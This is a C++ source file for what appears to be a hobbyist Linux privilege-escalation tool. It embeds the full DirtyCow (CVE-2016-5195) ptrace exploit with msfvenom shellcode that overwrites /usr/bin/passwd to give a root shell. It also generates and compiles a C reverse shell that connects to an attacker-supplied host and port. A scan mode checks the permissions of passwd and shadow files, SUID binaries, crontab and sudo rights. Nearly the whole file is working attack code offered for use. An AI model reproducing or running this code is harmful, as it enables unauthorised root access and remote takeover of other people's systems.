#include <iostream>
#include <fstream>
#include <vector>
#include <csignal>
#include <sstream>
#include<stdio.h>
#include<stdlib.h>
#include<unistd.h>
#include <string.h>
#include <sys/utsname.h>
#include <bits/stdc++.h>
#define EXIT_FAILURE 1
#define EXIT_SUCCESS 0
/* 
 * TODO
 *
 * FORK PROCESS AND GET CHILD PROCESS TO EXEC GCC SHELL.C -O SHELL.ELF
 * Find difference between sudo -l and  find / -type f -perm -04000 -ls 2>/dev/null
 * WHICHEVER ONE IS BETTER, SHOULD THEN BE PASSED TO OTHER FUNCTIONS TO ALLOW ATTACKS AGAINST THOSE SUID ELFS
 *
 * */ 


void kernelShell(void)
{
	char speechMark = '"';
	std::cout << "Retriving Kernel Shell via CVE 2016-5195(DirtyCow) Exploit" << std::endl;


	struct utsname version;
	int newVersion;
	std::string release;

	if (uname(&version) == -1)
	{
		std::cout << "Failed" << std::endl;
	}
	else
	{ 
		std::cout << "Checking Version Compatability" << std::endl;
	}

	release.push_back(version.release[0]);
	release.push_back(version.release[2]);

	std::stringstream obj;

	obj << release;
	obj >> newVersion;

	switch(newVersion)
	{
		case 48:
			std::cout << "Dirty Cow Attack not compatabile" << std::endl;
			break;
		case 44:
			std::cout << "Dirty Cow Attack not compatabile" << std::endl;
			break;
		case 31:
			std::cout << "Dirty Cow Attack not Compatabile" << std::endl;
			break;
		case 32:
			std::cout << "Dirty Cow Attack not compatabile" << std::endl;
			break;
		case 47:
			std::cout << "Dirty Cow Attack not compatabile" << std::endl;
			break;
	}
	if (newVersion >= 5) 
	{
		std::cout << "DirtyCow Attack not compatible" << std::endl;
		exit(EXIT_SUCCESS);
	}

	std::string suid_binary = """/usr/bin/passwd""";
	std::string kernelPayload = 
		/*
	* A PTRACE_POKEDATA variant of CVE-2016-5195
	* should work on RHEL 5 & 6
	* 
	* (un)comment correct payload (x86 or x64)!
	* $ gcc -pthread c0w.c  -o c0w
	* $ ./c0w
	* DirtyCow root privilege escalation
	* Backing up /usr/bin/passwd.. to /tmp/bak
	* mmap fa65a000
	* madvise 0
	* ptrace 0
	* $ /usr/bin/passwd 
	* [root@server foo]# whoami 
	* root
	* [root@server foo]# id
	* uid=0(root) gid=501(foo) groups=501(foo)
	* @KrE80r
	*/
		"#include <fcntl.h>\n"
		"#include <pthread.h>\n"
		"#include <string.h>\n"
		"#include <stdio.h>\n"
		"#include <stdint.h>\n"
		"#include <sys/mman.h>\n"
		"#include <sys/stat.h>\n"
		"#include <sys/types.h>\n"
		"#include <sys/wait.h>\n"
		"#include <sys/ptrace.h>\n"
		"#include <unistd.h>\n"

		"int f;\n"
		"void *map;\n"
		"pid_t pid;\n"
		"pthread_t pth;\n"
		"struct stat st;\n"

		// change if no permissions to read
		"char suid_binary[] =\"/usr/bin/passwd\";\n" 

		/*
		* $ msfvenom -p linux/x64/exec CMD=/bin/bash PrependSetuid=True -f elf | xxd -i
		*/ 
		"unsigned char shell_code[] = {\n"
  		"0x7f, 0x45, 0x4c, 0x46, 0x02, 0x01, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00,\n"
  		"0x00, 0x00, 0x00, 0x00, 0x02, 0x00, 0x3e, 0x00, 0x01, 0x00, 0x00, 0x00,\n"
  		"0x78, 0x00, 0x40, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x00, 0x00,\n"
  		"0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,\n"
  		"0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x38, 0x00, 0x01, 0x00, 0x00, 0x00,\n"
  		"0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x07, 0x00, 0x00, 0x00,\n"
  		"0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40, 0x00,\n"
  		"0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x00, 0x00, 0x00, 0x00,\n"
  		"0xb1, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xea, 0x00, 0x00, 0x00,\n"
  		"0x00, 0x00, 0x00, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,\n"
  		"0x48, 0x31, 0xff, 0x6a, 0x69, 0x58, 0x0f, 0x05, 0x6a, 0x3b, 0x58, 0x99,\n"
  		"0x48, 0xbb, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x73, 0x68, 0x00, 0x53, 0x48,\n"
  		"0x89, 0xe7, 0x68, 0x2d, 0x63, 0x00, 0x00, 0x48, 0x89, 0xe6, 0x52, 0xe8,\n"
 		"0x0a, 0x00, 0x00, 0x00, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x62, 0x61, 0x73,\n"
  		"0x68, 0x00, 0x56, 0x57, 0x48, 0x89, 0xe6, 0x0f, 0x05\n"
		"};\n"
		"unsigned int sc_len = 177;\n"

		/*
		* $ msfvenom -p linux/x86/exec CMD=/bin/bash PrependSetuid=True -f elf | xxd -i
		unsigned char shell_code[] = {
  		0x7f, 0x45, 0x4c, 0x46, 0x01, 0x01, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00,
  		0x00, 0x00, 0x00, 0x00, 0x02, 0x00, 0x03, 0x00, 0x01, 0x00, 0x00, 0x00,
  		0x54, 0x80, 0x04, 0x08, 0x34, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  		0x00, 0x00, 0x00, 0x00, 0x34, 0x00, 0x20, 0x00, 0x01, 0x00, 0x00, 0x00,
  		0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  		0x00, 0x80, 0x04, 0x08, 0x00, 0x80, 0x04, 0x08, 0x88, 0x00, 0x00, 0x00,
  		0xbc, 0x00, 0x00, 0x00, 0x07, 0x00, 0x00, 0x00, 0x00, 0x10, 0x00, 0x00,
  		0x31, 0xdb, 0x6a, 0x17, 0x58, 0xcd, 0x80, 0x6a, 0x0b, 0x58, 0x99, 0x52,
  		0x66, 0x68, 0x2d, 0x63, 0x89, 0xe7, 0x68, 0x2f, 0x73, 0x68, 0x00, 0x68,
  		0x2f, 0x62, 0x69, 0x6e, 0x89, 0xe3, 0x52, 0xe8, 0x0a, 0x00, 0x00, 0x00,
  		0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x62, 0x61, 0x73, 0x68, 0x00, 0x57, 0x53,
  		0x89, 0xe1, 0xcd, 0x80
		};
		unsigned int sc_len = 136;
		*/

		"void *madviseThread(void *arg) {\n"
  		"int i,c=0;\n"
  		"for(i=0;i<200000000;i++)\n"
    		"c+=madvise(map,100,MADV_DONTNEED);\n"
  		"printf(\"madvise %d\\n\\n\",c);"
		"\n}\n"


		"int main(int argc,char *argv[]){ \n"

		";\n"
 		 "char *backup;\n"
 		 "printf(\"DirtyCow root privilege escalation\");\n"
 		 "printf(\"Backing up %s to /tmp/bak\", suid_binary);\n"
 		 "asprintf(&backup, \"cp %s /tmp/bak\", suid_binary);\n"
 		 "system(backup);\n"

		"f=open(suid_binary,O_RDONLY);\n"
  		"fstat(f,&st);\n"
  		"map=mmap(NULL,st.st_size+sizeof(long),PROT_READ,MAP_PRIVATE,f,0);\n"
  		"printf(\"mmap %x\\n\\n\",map);\n"
  		"pid=fork();\n"
  		"if(pid){\n"
    			"waitpid(pid,NULL,0);\n"
    			"int u,i,o,c=0,l=sc_len;\n"
    			"for(i=0;i<10000/l;i++)\n"
      				"for(o=0;o<l;o++)\n"
        				"for(u=0;u<10000;u++)\n"
          					"c+=ptrace(PTRACE_POKETEXT,pid,map+o,*((long*)(shell_code+o)));\n"
    			"printf(\"ptrace %d\\n\\n\",c);\n"
   		"}\n"
  		"else{\n"
    			"pthread_create(&pth,\n"
                 		"  NULL,\n"
                   		"madviseThread,\n"
                   		"NULL);\n"
    		"ptrace(PTRACE_TRACEME);\n"
    		"kill(getpid(),SIGSTOP);\n"
    		"pthread_join(pth,NULL);\n"
    		"}\n"
  		"return 0;\n"
		"}\n";

	std::cout << "Payload: \n" << kernelPayload << std::endl;

	putchar('\n');
	std::cout << "--------------------------------------" << std::endl;

	putchar('\n');
	std::cout << "[+] DOUBLE CHECK THE PAYLOAD, HAPPY?[Y/N]: ";
	std::string answer;
	std::cin >> answer;
	if (answer == "Y")
	{
		std::cout << "\n[+] SAVING PAYLOAD" << std::endl;
		std::ofstream outf{"DirtyCow.c"};
		if (!outf)
		{
			std::cerr << "[!] ERROR WRITING PAYLOAD TO FILE\n" << std::endl;
			exit(EXIT_FAILURE);
		}
		else 
		{
			outf << kernelPayload;
			try
			{
				int pid = fork();
				if (pid == 0)
				{
					std::system("gcc -pthread DirtyCow.c -o DirtyCow");
					exit(EXIT_SUCCESS);

				}
			}
			catch (int a)
			{
				std::cerr << "[!] ERROR COMPILING C PAYLOAD VIA GCC" << a << std::endl;
			}

		}
	}
	else
	{
		exit(EXIT_FAILURE);
	}
		

}
 
int writeShell(char *argv[]) // void writeShell(char *argv[])
{
	std::cout << "[+] GENERATING PAYLOAD...." << std::endl;
	putchar('\n');

	std::string lhost = argv[2];
	std::string lport = argv[3];
	int lhostlen = lhost.length();
	char lhostArray[lhostlen];
	char lportArray[11];
	char LHOST[22];
	char LPORT[5];	
	char QuotationMark = '"';
	
	
	

	lhost.copy (lhostArray, lhostlen);
	lport.copy (lportArray, 11);

	
	// int sizeofArray = sizeof(lhostArray)/sizeof(lhostArray[0]);
	// std::cout << sizeofArray << std::endl;

	std::string equalhost;
	std::string equalport;
	equalhost.push_back(lhostArray[5]);


	if (equalhost != "=")
	{
		std::cout << "LHOST ERROR. Please use LHOST=" << std::endl;
		exit(EXIT_FAILURE);
	}

	equalport.push_back(lportArray[5]);
	
	if (equalport != "=")
	{
		std::cout << "LPORT ERROR. Please use LPORT=" << std::endl;
		std::cout << "LOOP LPORT [5]" << lportArray[5] << std::endl;
		exit(EXIT_FAILURE);
	}


	for (int i=6; i < 21; i++ )
	{
		LHOST[i-6]=lhostArray[i];
		LPORT[i-6]=lportArray[i];
	}

	std::stoi(LPORT);
	lport = LPORT;
	
	std:: cout << "-----------------------------------" << std::endl;
	putchar('\n');
	std::string payload = "#include <stdio.h>\n"
			"#include <sys/socket.h>\n"
			"#include <sys/types.h>\n"
			"#include <stdlib.h>\n"
			"#include <unistd.h>\n"
			"#include <netinet/in.h>\n"
			"#include <arpa/inet.h>\n"

			"int main(void)\n"
			"{\n"
			"    int port = "+lport+";\n"
			"    struct sockaddr_in revsockaddr;\n"
			"    int sockt = socket(AF_INET, SOCK_STREAM, 0);\n"
			"    revsockaddr.sin_family = AF_INET;\n"       
			"    revsockaddr.sin_port = htons(port);\n"
			"    revsockaddr.sin_addr.s_addr = inet_addr("+QuotationMark+""+LHOST+""+QuotationMark+");\n"
			"    connect(sockt, (struct sockaddr *) &revsockaddr,\n" 
			"    sizeof(revsockaddr));\n"
			"    dup2(sockt, 0);\n"
			"    dup2(sockt, 1);\n"
			"    dup2(sockt, 2);\n"
			"    char * const argv[] = {"+QuotationMark+"""/bin/sh"+QuotationMark+", NULL};\n"
			"    execve("+QuotationMark+"""/bin/sh"+QuotationMark+", argv, NULL);\n"
			"    return 0;\n"       
			"}\n";

	std::cout << payload << std::endl;
	putchar('\n');
	std::cout << "--------------------------------------" << std::endl;

	putchar('\n');
	std::cout << "[+] DOUBLE CHECK THE PAYLOAD, HAPPY?[Y/N]: ";
	std::string answer;
	std::cin >> answer;
	if (answer == "Y")
	{
		std::cout << "\n[+] SAVING PAYLOAD" << std::endl;
		std::ofstream outf{"shell.c"};
		if (!outf)
		{
			std::cerr << "[!] ERROR WRITING PAYLOAD TO FILE\n" << std::endl;
			return 1;
		}
		else 
		{
			outf << payload;
			try
			{
				int pid = fork();
				if (pid == 0)
				{
					std::system("gcc shell.c -o shell");
					exit(EXIT_SUCCESS);

				}
			}
			catch (int a)
			{
				std::cerr << "[!] ERROR COMPILING C PAYLOAD VIA GCC" << a << std::endl;
			}

		}
	}
	else
	{
		exit(EXIT_FAILURE);
	}
	return 0;
}

void GetShell(void)
{
	std::cout << "Called from GetShell()" << std::endl;
}

void SysInfo(void)
{
	std::system("hostnamectl");
}

void WFP(void)
{
	std::cout << "" << std::endl;	std::cout << "[+] Weak Find Permission" << std::endl;
	std::system("ls -al /$HOME/../../etc/passwd");
	std::system("ls -al /$HOME/../../etc/shadow");
	std::system("ls -al /$HOME/../../etc/pwd.db");
	std::system("ls -al /$HOME/../../etc/master.passwd");
	std::system("grep -v '^[^:]*:[x\\*]' /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null");
	// std::system("for d in `echo $PATH | tr ":" "\\n"`; do find $d -name "*.sh" 2>/dev/null; done for d in `echo $PATH | tr ":" "\\n"`; do find $d -type -f -executable 2>/dev/null; done"); // Scripts or binaries in PATH
	std::cout << "" << std::endl;
}

void cronTab(void)
{
	std::cout << "[+] Finding CRONTAB schedule..." << std::endl;
	std::system("ls -al /$HOME/../../etc/crontab");
	std::cout << std::endl;
}

void FindAllsuid(void)
{
	std::cout << "[+] Finding all SUID/GUID Executables..." << std::endl;
	std::cout << "" << std::endl;
	std::system(" find / -type f -a \\( -perm -u+s -o -perm -g+s \\) -exec ls -l {} \\; 2> /dev/null ");
	
}

void sharedObjectLibaryInjection(void)
{
}

int SudoL(void)
{
	int flag = 0;
	try
	{
		
		std::cout << "CRTL+C if you don't know the SUDO Password" << std:: endl;
		const int sudoList = std::system("sudo -l");
		std::cout << sudoList << std::endl;
		flag = 1;
		
	}
	catch(int a)
	{
		std::cout << "" << std::endl;
		flag = 0;
		
	}


	return flag;
}

int main(int argc, char *argv[])
{
	std::string sudoPass;
	int retflag;
	int LHOST;
	int LPORT;
	int argFlag = 0;
	
	if (argc == 1)
	{
		std::cout << "No Argument supplied" << std::endl;
		exit(EXIT_SUCCESS);
	}
	if (std::string(argv[1]) == "-h"|| std::string(argv[1]) == "/?" )
	{
		std::cout << "\n-Scan [scan for escalation]\n"
			"-kernel-shell [Escalate via CVE 2016-5195(DirtyCOw) Use with caution]\n"
			"-shell [Attempts to get a reverse shell ASAP] usage: ./privesc -shell LPORT=<IP> LPORT=<PORT>\n";
		putchar('\n');
		exit(EXIT_SUCCESS);

	}
	if (std::string(argv[1]) == "-kernel-shell")
	{
		kernelShell();
	}
	if (std::string(argv[1]) == "-scan")
	{
		std::cout << "\nScan Mode" << std::endl;
		std::cout << ("\n-----------------------------------------------\n");
		SysInfo();
		WFP();
		cronTab();
		FindAllsuid();
		// Scan Functions
		exit(EXIT_SUCCESS);
	}

	if (std::string(argv[1]) == "-shell")
	{
		std::cout << "Getting Shell" << std::endl;
		// exit(EXIT_SUCCESS);
		if (std::string(argv[2]) != " ")
		{
		
			// std::cout << "LHOST: " << argv[2] << std::endl;
			argFlag++;

		}
		else
		{
			std::cout << "Please provide LHOST" << std::endl;
		}
		if (std::string(argv[3]) != " " )
		{
			// std::cout << "LPORT: " << argv[3] << std::endl;
			argFlag++;
		}
		else
		{
			std::cout << "Please provide LPORT" << std::endl;
		}
		if (argFlag == 2)
		{
			// std::cout << "*argv: " << *argv << std::endl;
			// std::cout << "argv[2]: "<< argv[2] << std::endl;
			// std::cout << "argv[3]: "<< argv[3] << std::endl; 
			writeShell(argv);
		}
		else
		{
			std::cout << "Settings incorrect, try again" << std::endl;
			exit(EXIT_FAILURE);
		}
		
	}
	
	else
	{
		std::cout << "Invalid Arguments" << std::endl;
		exit(EXIT_FAILURE);
	}

	
	 

	std::cout << "Linux Privlege Escalation" << std::endl;
	std::cout << "" << std::endl;
	std::cout << "Enter SUDO password if known" << std::endl;
	std::cin >> sudoPass;
	
	if (sudoPass == "none")
	{
		std::cout << "Skipping SUDO Pass" << std::endl;
	}
	else
	{
		SudoL();
		
	}

	// retflag = SudoL();
	// if (retflag == 1)
	
	SysInfo();	
	WFP();
	cronTab();
	FindAllsuid();
	
	



	return 0;
}

